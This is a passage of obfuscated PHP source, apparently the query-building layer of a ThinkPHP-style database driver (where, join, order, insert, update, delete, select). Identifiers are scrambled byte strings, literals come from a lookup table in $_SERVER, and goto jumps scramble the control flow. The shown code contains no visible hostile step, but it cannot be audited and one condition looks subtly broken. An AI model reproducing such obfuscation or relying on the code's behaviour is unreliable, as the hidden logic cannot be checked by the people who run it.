array_walk($DÊø†×³ëÇ, array($this, $c²ò»Ã“ÑŠ[808])); } return $c²ò»Ã“ÑŠ[902] . trim(implode($c²ò»Ã“ÑŠ[903], $DÊø†×³ëÇ), $c²ò»Ã“ÑŠ[814]) . $c²ò»Ã“ÑŠ[902]; } protected function parseWhere($dĞ»¯…æ¹¤) { $DóÈËèÚŸï =& $_SERVER[£ü]; $B¡Çì¨Çš = $DóÈËèÚŸï[33]; if (is_string($dĞ»¯…æ¹¤)) { $B¡Çì¨Çš = $dĞ»¯…æ¹¤; } else { $A§º•»Å¢ = isset($dĞ»¯…æ¹¤[$DóÈËèÚŸï[904]]) ? strtoupper($dĞ»¯…æ¹¤[$DóÈËèÚŸï[904]]) : $DóÈËèÚŸï[33]; if (in_array($A§º•»Å¢, array($DóÈËèÚŸï[905], $DóÈËèÚŸï[906], $DóÈËèÚŸï[907]))) { $A§º•»Å¢ = $DóÈËèÚŸï[50] . $A§º•»Å¢ . $DóÈËèÚŸï[50]; unset($dĞ»¯…æ¹¤[$DóÈËèÚŸï[904]]); } else { $A§º•»Å¢ = $DóÈËèÚŸï[908]; } foreach ($dĞ»¯…æ¹¤ as $cö„ö¨š…ƒ => $bÖ´½“„é) { $B¡Çì¨Çš .= $DóÈËèÚŸï[262]; if (is_numeric($cö„ö¨š…ƒ)) { $cö„ö¨š…ƒ = $DóÈËèÚŸï[909]; } if (0 === strpos($cö„ö¨š…ƒ, $DóÈËèÚŸï[70])) { $B¡Çì¨Çš .= $this->parseThinkWhere($cö„ö¨š…ƒ, $bÖ´½“„é); } else { if (!preg_match($DóÈËèÚŸï[910], trim($cö„ö¨š…ƒ))) { think_exception(think_lang($DóÈËèÚŸï[911]) . $DóÈËèÚŸï[4] . $cö„ö¨š…ƒ); } $BĞÑ—ô˜…” = is_array($bÖ´½“„é) && isset($bÖ´½“„é[$DóÈËèÚŸï[912]]); $cö„ö¨š…ƒ = trim($cö„ö¨š…ƒ); if (strpos($cö„ö¨š…ƒ, $DóÈËèÚŸï[268])) { $D’òÂ¬àí = explode($DóÈËèÚŸï[268], $cö„ö¨š…ƒ); $e öÆ¥ÀÚÓ = array(); foreach ($D’òÂ¬àí as $A…¤ ”Ò‚ğ => $FÓµ–ø›«) { $D±¢™À½’¡ = $BĞÑ—ô˜…” ? $bÖ´½“„é[$A…¤ ”Ò‚ğ] : $bÖ´½“„é; $e öÆ¥ÀÚÓ[] = $DóÈËèÚŸï[245] . $this->parseWhereItem($this->parseKey($FÓµ–ø›«), $D±¢™À½’¡) . $DóÈËèÚŸï[807]; } $B¡Çì¨Çš .= implode($DóÈËèÚŸï[913], $e öÆ¥ÀÚÓ); } elseif (strpos($cö„ö¨š…ƒ, $DóÈËèÚŸï[269])) { $D’òÂ¬àí = explode($DóÈËèÚŸï[269], $cö„ö¨š…ƒ); $e öÆ¥ÀÚÓ = array(); foreach ($D’òÂ¬àí as $A…¤ ”Ò‚ğ => $FÓµ–ø›«) { $D±¢™À½’¡ = $BĞÑ—ô˜…” ? $bÖ´½“„é[$A…¤ ”Ò‚ğ] : $bÖ´½“„é; $e öÆ¥ÀÚÓ[] = $DóÈËèÚŸï[245] . $this->parseWhereItem($this->parseKey($FÓµ–ø›«), $D±¢™À½’¡) . $DóÈËèÚŸï[807]; } $B¡Çì¨Çš .= implode($DóÈËèÚŸï[908], $e öÆ¥ÀÚÓ); } else { $B¡Çì¨Çš .= $this->parseWhereItem($this->parseKey($cö„ö¨š…ƒ), $bÖ´½“„é); } } $B¡Çì¨Çš .= $DóÈËèÚŸï[263] . $A§º•»Å¢; } $B¡Çì¨Çš = substr($B¡Çì¨Çš, 0, -strlen($A§º•»Å¢)); } return empty($B¡Çì¨Çš) ? $DóÈËèÚŸï[33] : $DóÈËèÚŸï[914] . $B¡Çì¨Çš; } protected function parseWhereItem($D¼×Ü¬ö—Ö, $FĞ¡Æ ‰÷¦) { $BÀ—‚‡Æ­Á =& $_SERVER[£ü]; $EÙö©íœğä = $BÀ—‚‡Æ­Á[33]; if (is_array($FĞ¡Æ ‰÷¦)) { if (is_string($FĞ¡Æ ‰÷¦[0])) { $Cğõ¥Ìï½ = strtolower($FĞ¡Æ ‰÷¦[0]); if (in_array($FĞ¡Æ ‰÷¦[0], array($BÀ—‚‡Æ­Á[897], $BÀ—‚‡Æ­Á[915], $BÀ—‚‡Æ­Á[916], $BÀ—‚‡Æ­Á[917], $BÀ—‚‡Æ­Á[918], $BÀ—‚‡Æ­Á[919]))) { $EÙö©íœğä .= $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $FĞ¡Æ ‰÷¦[0] . $BÀ—‚‡Æ­Á[50] . $this->parseValue($FĞ¡Æ ‰÷¦[1]); } elseif (preg_match($BÀ—‚‡Æ­Á[920], $FĞ¡Æ ‰÷¦[0])) { $EÙö©íœğä .= $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $this->exp[$Cğõ¥Ìï½] . $BÀ—‚‡Æ­Á[50] . $this->parseValue($FĞ¡Æ ‰÷¦[1]); } elseif (preg_match($BÀ—‚‡Æ­Á[921], $FĞ¡Æ ‰÷¦[0])) { if (is_array($FĞ¡Æ ‰÷¦[1])) { $C”ç§†ìà = isset($FĞ¡Æ ‰÷¦[2]) ? strtoupper($FĞ¡Æ ‰÷¦[2]) : $BÀ—‚‡Æ­Á[906]; if (in_array($C”ç§†ìà, array($BÀ—‚‡Æ­Á[905], $BÀ—‚‡Æ­Á[906], $BÀ—‚‡Æ­Á[907]))) { $dÕ«‚ã„òÎ = array(); foreach ($FĞ¡Æ ‰÷¦[1] as $b”‡Æê¬…¸) { $dÕ«‚ã„òÎ[] = $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $this->exp[$Cğõ¥Ìï½] . $BÀ—‚‡Æ­Á[50] . $this->parseValue($b”‡Æê¬…¸); } $EÙö©íœğä .= $BÀ—‚‡Æ­Á[245] . implode($BÀ—‚‡Æ­Á[50] . $C”ç§†ìà . $BÀ—‚‡Æ­Á[50], $dÕ«‚ã„òÎ) . $BÀ—‚‡Æ­Á[807]; } } else { $EÙö©íœğä .= $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $this->exp[$Cğõ¥Ìï½] . $BÀ—‚‡Æ­Á[50] . $this->parseValue($FĞ¡Æ ‰÷¦[1]); } } elseif ($BÀ—‚‡Æ­Á[282] == $Cğõ¥Ìï½) { $EÙö©íœğä .= $BÀ—‚‡Æ­Á[805] . $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $FĞ¡Æ ‰÷¦[1] . $BÀ—‚‡Æ­Á[922]; } elseif (preg_match($BÀ—‚‡Æ­Á[923], $FĞ¡Æ ‰÷¦[0])) { if (isset($FĞ¡Æ ‰÷¦[2]) && $BÀ—‚‡Æ­Á[282] == $FĞ¡Æ ‰÷¦[2]) { $EÙö©íœğä .= $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $this->exp[$Cğõ¥Ìï½] . $BÀ—‚‡Æ­Á[50] . $FĞ¡Æ ‰÷¦[1]; } else { if (is_string($FĞ¡Æ ‰÷¦[1])) { $FĞ¡Æ ‰÷¦[1] = explode($BÀ—‚‡Æ­Á[47], $FĞ¡Æ ‰÷¦[1]); } $dÊ†ğª¾ é = implode($BÀ—‚‡Æ­Á[47], $this->parseValue($FĞ¡Æ ‰÷¦[1])); $EÙö©íœğä .= $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $this->exp[$Cğõ¥Ìï½] . $BÀ—‚‡Æ­Á[805] . $dÊ†ğª¾ é . $BÀ—‚‡Æ­Á[807]; } } elseif (preg_match($BÀ—‚‡Æ­Á[924], $FĞ¡Æ ‰÷¦[0])) { $bªŒÄµ³š = is_string($FĞ¡Æ ‰÷¦[1]) ? explode($BÀ—‚‡Æ­Á[47], $FĞ¡Æ ‰÷¦[1]) : $FĞ¡Æ ‰÷¦[1]; $EÙö©íœğä .= $BÀ—‚‡Æ­Á[805] . $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $this->exp[$Cğõ¥Ìï½] . $BÀ—‚‡Æ­Á[50] . $this->parseValue($bªŒÄµ³š[0]) . $BÀ—‚‡Æ­Á[908] . $this->parseValue($bªŒÄµ³š[1]) . $BÀ—‚‡Æ­Á[263]; } else { think_exception(think_lang($BÀ—‚‡Æ­Á[911]) . $BÀ—‚‡Æ­Á[4] . $FĞ¡Æ ‰÷¦[0]); } } else { $a‡§ˆ©îˆ¨ = count($FĞ¡Æ ‰÷¦); $aµƒùéˆÊ = isset($FĞ¡Æ ‰÷¦[$a‡§ˆ©îˆ¨ - 1]) ? strtoupper($FĞ¡Æ ‰÷¦[$a‡§ˆ©îˆ¨ - 1]) : $BÀ—‚‡Æ­Á[33]; if (in_array($aµƒùéˆÊ, array($BÀ—‚‡Æ­Á[905], $BÀ—‚‡Æ­Á[906], $BÀ—‚‡Æ­Á[907]))) { $a‡§ˆ©îˆ¨ = $a‡§ˆ©îˆ¨ - 1; } else { $aµƒùéˆÊ = $BÀ—‚‡Æ­Á[905]; } for ($B÷„»Ä‘‰Û = 0; $B÷„»Ä‘‰Û < $a‡§ˆ©îˆ¨; $B÷„»Ä‘‰Û++) { $bªŒÄµ³š = is_array($FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û]) ? $FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û][1] : $FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û]; if ($BÀ—‚‡Æ­Á[282] == strtolower($FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û][0])) { $EÙö©íœğä .= $BÀ—‚‡Æ­Á[245] . $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $bªŒÄµ³š . $BÀ—‚‡Æ­Á[922] . $aµƒùéˆÊ . $BÀ—‚‡Æ­Á[50]; } else { $AŒõĞ‹‡ĞÌ = is_array($FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û]) ? $this->exp[strtolower($FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û][0])] : $BÀ—‚‡Æ­Á[897]; if (!$AŒõĞ‹‡ĞÌ && is_array($FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û]) && in_array($FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û][0], array($BÀ—‚‡Æ­Á[897], $BÀ—‚‡Æ­Á[915], $BÀ—‚‡Æ­Á[916], $BÀ—‚‡Æ­Á[917], $BÀ—‚‡Æ­Á[918], $BÀ—‚‡Æ­Á[919]))) { $AŒõĞ‹‡ĞÌ = $FĞ¡Æ ‰÷¦[$B÷„»Ä‘‰Û][0]; } $EÙö©íœğä .= $BÀ—‚‡Æ­Á[245] . $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[50] . $AŒõĞ‹‡ĞÌ . $BÀ—‚‡Æ­Á[50] . $this->parseValue($bªŒÄµ³š) . $BÀ—‚‡Æ­Á[922] . $aµƒùéˆÊ . $BÀ—‚‡Æ­Á[50]; } } $EÙö©íœğä = substr($EÙö©íœğä, 0, -4); } } else { $EÙö©íœğä .= $D¼×Ü¬ö—Ö . $BÀ—‚‡Æ­Á[925] . $this->parseValue($FĞ¡Æ ‰÷¦); } return $EÙö©íœğä; } protected function parseThinkWhere($Dç¹ˆïğ‹İ, $dŞØ×´ç¢) { $DÈ“Ï Ù± =& $_SERVER[£ü]; $d÷ÊØš‘¦ = $DÈ“Ï Ù±[33]; switch ($Dç¹ˆïğ‹İ) { case $DÈ“Ï Ù±[336]: $d÷ÊØš‘¦ = $dŞØ×´ç¢; break; case $DÈ“Ï Ù±[909]: $d÷ÊØš‘¦ = is_string($dŞØ×´ç¢) ? $dŞØ×´ç¢ : substr($this->parseWhere($dŞØ×´ç¢), 6); break; case $DÈ“Ï Ù±[926]: parse_str($dŞØ×´ç¢, $aìˆ¸¦‘Ú„); if (isset($aìˆ¸¦‘Ú„[$DÈ“Ï Ù±[904]])) { $C°Ä¼Æ™Ş = $DÈ“Ï Ù±[50] . strtoupper($aìˆ¸¦‘Ú„[$DÈ“Ï Ù±[904]]) . $DÈ“Ï Ù±[50]; unset($aìˆ¸¦‘Ú„[$DÈ“Ï Ù±[904]]); } else { $C°Ä¼Æ™Ş = $DÈ“Ï Ù±[908]; } $eùÆÍ­Œ…Ù = array(); foreach ($aìˆ¸¦‘Ú„ as $cºÒä»Â „ => $b†´é¹´Á‚) { $eùÆÍ­Œ…Ù[] = $this->parseKey($cºÒä»Â „) . $DÈ“Ï Ù±[925] . $this->parseValue($b†´é¹´Á‚); } $d÷ÊØš‘¦ = implode($C°Ä¼Æ™Ş, $eùÆÍ­Œ…Ù); break; } return $d÷ÊØš‘¦; } protected function parseLimit($f»‹±ÙÉÉ) { $CÔäÜÑÉ¥ƒ =& $_SERVER[£ü]; return !empty($f»‹±ÙÉÉ) ? $CÔäÜÑÉ¥ƒ[48] . $f»‹±ÙÉÉ . $CÔäÜÑÉ¥ƒ[50] : $CÔäÜÑÉ¥ƒ[33]; } protected function parseJoin($aßÏæ¹ì) { $bæ°”¤å¾… =& $_SERVER[£ü]; $CªôÖºÆ‰ô = $bæ°”¤å¾…[33]; if (!empty($aßÏæ¹ì)) { if (is_array($aßÏæ¹ì)) { foreach ($aßÏæ¹ì as $bìéåî¬„‰ => $c¯íéó±÷ì) { if (!1 !== stripos($c¯íéó±÷ì, $bæ°”¤å¾…[927])) { $CªôÖºÆ‰ô .= $bæ°”¤å¾…[50] . $c¯íéó±÷ì; } else { $CªôÖºÆ‰ô .= $bæ°”¤å¾…[928] . $c¯íéó±÷ì; } } } else { $CªôÖºÆ‰ô .= $bæ°”¤å¾…[928] . $aßÏæ¹ì; } } $CªôÖºÆ‰ô = preg_replace($bæ°”¤å¾…[929], think_config($bæ°”¤å¾…[832]) . $bæ°”¤å¾…[930], $CªôÖºÆ‰ô); return $CªôÖºÆ‰ô; } protected function parseOrder($fØææ‹®ª) { $a…Úñã•¿» =& $_SERVER[£ü]; if (is_array($fØææ‹®ª)) { $aâ©ø«ÄÌ = array(); foreach ($fØææ‹®ª as $A¹ªâ¥— => $E­Ñó¦¯íí) { if (is_numeric($A¹ªâ¥—)) { $aâ©ø«ÄÌ[] = $this->parseKey($E­Ñó¦¯íí); } else { $E­Ñó¦¯íí = in_array(strtoupper(trim($E­Ñó¦¯íí)), array($a…Úñã•¿»[931], $a…Úñã•¿»[932])) ? $a…Úñã•¿»[50] . $E­Ñó¦¯íí : $a…Úñã•¿»[33]; if (preg_match($a…Úñã•¿»[933], $A¹ªâ¥—)) { $aâ©ø«ÄÌ[] = $this->parseKey($A¹ªâ¥—) . $E­Ñó¦¯íí; } else { think_exception($a…Úñã•¿»[934] . $A¹ªâ¥—); } } } $fØææ‹®ª = implode($a…Úñã•¿»[47], $aâ©ø«ÄÌ); } return !empty($fØææ‹®ª) ? $a…Úñã•¿»[935] . $fØææ‹®ª : $a…Úñã•¿»[33]; } protected function parseGroup($eÃõ“ãçÕ) { $BÁ»î™¡” =& $_SERVER[£ü]; return !empty($eÃõ“ãçÕ) ? $BÁ»î™¡”[936] . $eÃõ“ãçÕ : $BÁ»î™¡”[33]; } protected function parseHaving($c†õÇŒÏ‚Ï) { $b•œ¨ˆ©Âñ =& $_SERVER[£ü]; return !empty($c†õÇŒÏ‚Ï) ? $b•œ¨ˆ©Âñ[937] . $c†õÇŒÏ‚Ï : $b•œ¨ˆ©Âñ[33]; } protected function parseComment($c‰õ†‘Å¿³) { $f‡¾‰ì¡­ =& $_SERVER[£ü]; return !empty($c‰õ†‘Å¿³) ? $f‡¾‰ì¡­[938] . $c‰õ†‘Å¿³ . $f‡¾‰ì¡­[939] : $f‡¾‰ì¡­[33]; } protected function parseDistinct($dÊ³ÚÁ“Ê) { $f£é”¿Ø =& $_SERVER[£ü]; return !empty($dÊ³ÚÁ“Ê) ? $f£é”¿Ø[940] : $f£é”¿Ø[33]; } protected function parseUnion($c‰…‡¢ó‘©) { $A¦À„Á‚Ç‰ =& $_SERVER[£ü]; if (empty($c‰…‡¢ó‘©)) { return $A¦À„Á‚Ç‰[33]; } if (isset($c‰…‡¢ó‘©[$A¦À„Á‚Ç‰[333]])) { $B¶ô ÏÉÙá = $A¦À„Á‚Ç‰[941]; unset($c‰…‡¢ó‘©[$A¦À„Á‚Ç‰[333]]); } else { $B¶ô ÏÉÙá = $A¦À„Á‚Ç‰[942]; } foreach ($c‰…‡¢ó‘© as $AÜ¼ßÖÎ˜) { $fŒ¸Ú´ì¼†[] = $B¶ô ÏÉÙá . (is_array($AÜ¼ßÖÎ˜) ? $this->buildSelectSql($AÜ¼ßÖÎ˜) : $AÜ¼ßÖÎ˜); } return implode($A¦À„Á‚Ç‰[50], $fŒ¸Ú´ì¼†); } public function insert($fë¼‹–¸’Ú, $CÇ¿¦òÕŒ = array(), $fìò§‚Í•À = false) { goto fÕÎö®‹‰ì; eæÇğ¡Êà¤: foreach ($fë¼‹–¸’Ú as $Fï•µ‚§†™ => $féº†–ÙÃÍ) { if (is_array($féº†–ÙÃÍ) && $ağ¼Üâ£ƒò[282] == $féº†–ÙÃÍ[0]) { $AƒÅº‚‚â˜[] = $this->parseKey($Fï•µ‚§†™); $Cë£ïô”æˆ[] = $féº†–ÙÃÍ[1]; } elseif (is_scalar($féº†–ÙÃÍ) || is_null($féº†–ÙÃÍ)) { $AƒÅº‚‚â˜[] = $this->parseKey($Fï•µ‚§†™); $Cë£ïô”æˆ[] = $this->parseValue($féº†–ÙÃÍ); } } $D ‡À¸À¡£ = ($fìò§‚Í•À ? $ağ¼Üâ£ƒò[809] : $ağ¼Üâ£ƒò[810]) . $ağ¼Üâ£ƒò[811] . $this->parseTable($CÇ¿¦òÕŒ[$ağ¼Üâ£ƒò[264]]) . $ağ¼Üâ£ƒò[805] . implode($ağ¼Üâ£ƒò[47], $AƒÅº‚‚â˜) . $ağ¼Üâ£ƒò[806] . implode($ağ¼Üâ£ƒò[47], $Cë£ïô”æˆ) . $ağ¼Üâ£ƒò[807]; $D ‡À¸À¡£ .= $this->parseLock(isset($CÇ¿¦òÕŒ[$ağ¼Üâ£ƒò[766]]) ? $CÇ¿¦òÕŒ[$ağ¼Üâ£ƒò[766]] : !1); goto aĞñÚò”™; fÕÎö®‹‰ì: $ağ¼Üâ£ƒò =& $_SERVER[£ü]; $Cë£ïô”æˆ = $AƒÅº‚‚â˜ = array(); $this->model = $CÇ¿¦òÕŒ[$ağ¼Üâ£ƒò[266]]; goto eæÇğ¡Êà¤; aĞñÚò”™: $D ‡À¸À¡£ .= $this->parseComment(!empty($CÇ¿¦òÕŒ[$ağ¼Üâ£ƒò[338]]) ? $CÇ¿¦òÕŒ[$ağ¼Üâ£ƒò[338]] : $ağ¼Üâ£ƒò[33]); return $this->execute($D ‡À¸À¡£, $this->parseBind(!empty($CÇ¿¦òÕŒ[$ağ¼Üâ£ƒò[270]]) ? $CÇ¿¦òÕŒ[$ağ¼Üâ£ƒò[270]] : array())); goto dßã‰Õí‰; dßã‰Õí‰: } public function selectInsert($c‰Î·£ğ¢, $d›¤ÀÓÂ»Í, $bß¿’í¯‚¨ = array()) { goto BÔÃ‘Ì²÷®; aÉ¦Ê‡•: return $this->execute($e´è†Ï¯‡™, $this->parseBind(!empty($bß¿’í¯‚¨[$dØÊæˆÑĞŒ[270]]) ? $bß¿’í¯‚¨[$dØÊæˆÑĞŒ[270]] : array())); goto fèÖ–Ì»÷; BÒ¶«ö„½‘: array_walk($c‰Î·£ğ¢, array($this, $dØÊæˆÑĞŒ[808])); $e´è†Ï¯‡™ = $dØÊæˆÑĞŒ[943] . $this->parseTable($d›¤ÀÓÂ»Í) . $dØÊæˆÑĞŒ[805] . implode($dØÊæˆÑĞŒ[47], $c‰Î·£ğ¢) . $dØÊæˆÑĞŒ[922]; $e´è†Ï¯‡™ .= $this->buildSelectSql($bß¿’í¯‚¨); goto aÉ¦Ê‡•; BÔÃ‘Ì²÷®: $dØÊæˆÑĞŒ =& $_SERVER[£ü]; $this->model = $bß¿’í¯‚¨[$dØÊæˆÑĞŒ[266]]; if (is_string($c‰Î·£ğ¢)) { $c‰Î·£ğ¢ = explode($dØÊæˆÑĞŒ[47], $c‰Î·£ğ¢); } goto BÒ¶«ö„½‘; fèÖ–Ì»÷: } public function update($EÌ…âğĞ´Ÿ, $AÂ¸ù¨½‚„) { $b‰Ñ‡‹ŒÚÎ =& $_SERVER[£ü]; $this->model = $AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[266]]; $C§ÀØ ºª = $b‰Ñ‡‹ŒÚÎ[944] . $this->parseTable($AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[264]]) . $this->parseSet($EÌ…âğĞ´Ÿ) . $this->parseWhere(!empty($AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[260]]) ? $AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[260]] : $b‰Ñ‡‹ŒÚÎ[33]) . $this->parseOrder(!empty($AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[347]]) ? $AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[347]] : $b‰Ñ‡‹ŒÚÎ[33]) . $this->parseLimit(!empty($AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[277]]) ? $AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[277]] : $b‰Ñ‡‹ŒÚÎ[33]) . $this->parseLock(isset($AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[766]]) ? $AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[766]] : !1) . $this->parseComment(!empty($AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[338]]) ? $AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[338]] : $b‰Ñ‡‹ŒÚÎ[33]); return $this->execute($C§ÀØ ºª, $this->parseBind(!empty($AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[270]]) ? $AÂ¸ù¨½‚„[$b‰Ñ‡‹ŒÚÎ[270]] : array())); } public function delete($F¼µïµ…ª = array()) { $Bôğ÷—™µª =& $_SERVER[£ü]; $this->model = $F¼µïµ…ª[$Bôğ÷—™µª[266]]; $eÚ¿ğÖèİ = $Bôğ÷—™µª[945] . $this->parseTable($F¼µïµ…ª[$Bôğ÷—™µª[264]]) . $this->parseWhere(!empty($F¼µïµ…ª[$Bôğ÷—™µª[260]]) ? $F¼µïµ…ª[$Bôğ÷—™µª[260]] : $Bôğ÷—™µª[33]) . $this->parseOrder(!empty($F¼µïµ…ª[$Bôğ÷—™µª[347]]) ? $F¼µïµ…ª[$Bôğ÷—™µª[347]] : $Bôğ÷—™µª[33]) . $this->parseLimit(!empty($F¼µïµ…ª[$Bôğ÷—™µª[277]]) ? $F¼µïµ…ª[$Bôğ÷—™µª[277]] : $Bôğ÷—™µª[33]) . $this->parseLock(isset($F¼µïµ…ª[$Bôğ÷—™µª[766]]) ? $F¼µïµ…ª[$Bôğ÷—™µª[766]] : !1) . $this->parseComment(!empty($F¼µïµ…ª[$Bôğ÷—™µª[338]]) ? $F¼µïµ…ª[$Bôğ÷—™µª[338]] : $Bôğ÷—™µª[33]); return $this->execute($eÚ¿ğÖèİ, $this->parseBind(!empty($F¼µïµ…ª[$Bôğ÷—™µª[270]]) ? $F¼µïµ…ª[$Bôğ÷—™µª[270]] : array())); } public function select($F¦¥‘âØƒß = array()) { goto B‹ö½æÍà¶; c¿÷ŞçĞÙ: $B¹ƒã¸»áà = isset($F¦¥‘âØƒß[$fÏïŸ®îŠà[334]]) ? $F¦¥‘âØƒß[$fÏïŸ®îŠà[334]] : !1; if ($B¹ƒã¸»áà) { $cğˆÎª‘±º = is_string($B¹ƒã¸»áà[$fÏïŸ®îŠà[89]]) ? $B¹ƒã¸»áà[$fÏïŸ®îŠà[89]] : $fÏïŸ®îŠà[946] . md5($BöÌÅ®…´²); $fô´Ø§ùŒ¸ = think_cache($cğˆÎª‘±º, $fÏïŸ®îŠà[33], $B¹ƒã¸»áà); if (!1 !== $fô´Ø§ùŒ¸) { return $fô´Ø§ùŒ¸; } } $aïß‹®íø¨ = $this->query($BöÌÅ®…´², $this->parseBind(!empty($F¦¥‘âØƒß[$fÏïŸ®îŠà[270]]) ? $F¦¥‘âØƒß[$fÏïŸ®îŠà[270]] : array())); goto CáÍ°‹£ô; CáÍ°‹£ô: if ($B¹ƒã¸»áà && !1 !== $aïß‹®íø¨) { think_cache($cğˆÎª‘±º, $aïß‹®íø¨, $B¹ƒã¸»áà); } return $aïß‹®íø¨; goto DÎ‘Ô…¦¢; B‹ö½æÍà¶: $fÏïŸ®îŠà =& $_SERVER[£ü]; $this->model = $F¦¥‘âØƒß[$fÏïŸ®îŠà[266]]; $BöÌÅ®…´² = $this->buildSelectSql($F¦¥‘âØƒß); goto c¿÷ŞçĞÙ; DÎ‘Ô…¦¢: } public function buildSelectSql($CÄ–„Â±… = array()) { goto cµğ°Áß¶‡; Cß§©’ …ö: return $C¼ÓÕÄ£†; goto CŞÇ »è¤; dƒáÁ®ê¹Ò: $C¼ÓÕÄ£† = $this->parseSql($this->selectSql, $CÄ–„Â±…); $C¼ÓÕÄ£† .= $this->parseLock(isset($CÄ–„Â±…[$e«ğÊ”ò×Á[766]]) ? $CÄ–„Â±…[$e«ğÊ”ò×Á[766]] : !1); if (isset($B½ßŒ‰·÷Š)) { think_cache($B½ßŒ‰·÷Š, $C¼ÓÕÄ£†); } goto Cß§©’ …ö; cµğ°Áß¶‡: $e«ğÊ”ò×Á =& $_SERVER[£ü]; if (isset($CÄ–„Â±…[$e«ğÊ”ò×Á[337]])) { if (strpos($CÄ–„Â±…[$e«ğÊ”ò×Á[337]], $e«ğÊ”ò×Á[47])) { list($dà›ÀÑ°ò–, $b…‹Ë·ŒÖ™) = explode($e«ğÊ”ò×Á[47], $CÄ–„Â±…[$e«ğÊ”ò×Á[337]]); } else { $dà›ÀÑ°ò– = $CÄ–„Â±…[$e«ğÊ”ò×Á[337]]; } $dà›ÀÑ°ò– = $dà›ÀÑ°ò– ? $dà›ÀÑ°ò– : 1; $b…‹Ë·ŒÖ™ = isset($b…‹Ë·ŒÖ™) ? $b…‹Ë·ŒÖ™ : (is_numeric($CÄ–„Â±…[$e«ğÊ”ò×Á[277]]) ? $CÄ–„Â±…[$e«ğÊ”ò×Á[277]] : 20); $c«•È’‹Œ… = $b…‹Ë·ŒÖ™ * ((int) $dà›ÀÑ°ò– - 1); $CÄ–„Â±…[$e«ğÊ”ò×Á[277]] = $c«•È’‹Œ… . $e«ğÊ”ò×Á[47] . $b…‹Ë·ŒÖ™; } if (think_config($e«ğÊ”ò×Á[947])) { $B½ßŒ‰·÷Š = $e«ğÊ”ò×Á[948] . md5(serialize($CÄ–„Â±…)); $BòÎ­Äó’™ = think_cache($B½ßŒ‰·÷Š); if ($BòÎ­Äó’™) { return $BòÎ­Äó’™; } } goto dƒáÁ®ê¹Ò; CŞÇ »è¤: } public function parseSql($AÔÚòóÙÚ, $BÔŞ™ççØ£ = array()) { $FÍ×ğ¾äÔ =& $_SERVER[£ü]; $AÔÚòóÙÚ = str_replace(array($FÍ×ğ¾äÔ[949], $FÍ×ğ¾äÔ[950], $FÍ×ğ¾äÔ[951], $FÍ×ğ¾äÔ[952], $FÍ×ğ¾äÔ[953], $FÍ×ğ¾äÔ[954], $FÍ×ğ¾äÔ[955], $FÍ×ğ¾äÔ[956], $FÍ×ğ¾äÔ[957], $FÍ×ğ¾äÔ[958], $FÍ×ğ¾äÔ[959]), array($this->parseTable("{$BÔŞ™ççØ£[$FÍ×ğ¾äÔ[264]]}"), $this->parseDistinct(isset($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[960]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[960]] : !1), $this->parseField(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[258]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[258]] : $FÍ×ğ¾äÔ[173]), $this->parseJoin(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[267]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[267]] : $FÍ×ğ¾äÔ[33]), $this->parseWhere(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[260]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[260]] : $FÍ×ğ¾äÔ[33]), $this->parseGroup(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[961]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[961]] : $FÍ×ğ¾äÔ[33]), $this->parseHaving(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[962]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[962]] : $FÍ×ğ¾äÔ[33]), $this->parseOrder(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[347]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[347]] : $FÍ×ğ¾äÔ[33]), $this->parseLimit(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[277]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[277]] : $FÍ×ğ¾äÔ[33]), $this->parseUnion(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[332]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[332]] : $FÍ×ğ¾äÔ[33]), $this->parseComment(!empty($BÔŞ™ççØ£[$FÍ×ğ¾äÔ[338]]) ? $BÔŞ™ççØ£[$FÍ×ğ¾äÔ[338]] : 